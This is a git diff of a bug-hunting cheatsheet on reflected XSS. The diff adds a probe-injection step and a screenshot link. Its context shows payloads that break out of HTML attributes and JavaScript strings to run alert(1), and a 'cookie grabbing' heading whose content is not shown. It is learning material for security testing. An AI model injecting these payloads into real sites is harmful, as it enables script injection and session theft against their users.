@@ -22,8 +22,11 @@ If this is the case, you should inject this payloads.
 "onmouseover="alert(1)
 ```
 ### Reflected XSS into a JavaScript string with angle brackets HTML encoded
+Inject ```<xss123>'"``` and see if your payload encoded in a javascript code.<br>
+![Screenshot from 2024-06-13 00-19-30](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/9180969c-2299-4adf-9c4a-a05e97629938)<br>
+In this case you should try this payload to braek the code to inject maliciuos payload.
+
 ```js
-<xss>'"
 xss';alert(1);'xss
 ```
 #### For cookie grabbing.
